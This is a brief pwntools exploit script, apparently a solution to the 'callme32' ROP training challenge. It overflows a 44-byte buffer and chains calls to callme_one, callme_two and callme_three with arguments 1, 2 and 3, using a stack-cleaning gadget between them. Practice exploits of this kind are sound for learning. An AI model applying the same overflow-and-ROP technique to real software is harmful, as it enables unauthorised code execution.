from pwn import *

e = ELF("callme32")

callmeOne = p32(e.symbols["callme_one"])
callmeTwo = p32(e.symbols["callme_two"])
callmeThree = p32(e.symbols["callme_three"])
popGadget = p32(0x080488a9)

params = p32(1) + p32(2) + p32(3)

crap = "A" * 44

payload = crap
payload += callmeOne + popGadget + params
payload += callmeTwo + popGadget + params
payload += callmeThree + popGadget + params


io = e.process()

io.sendline(payload)

io.interactive()
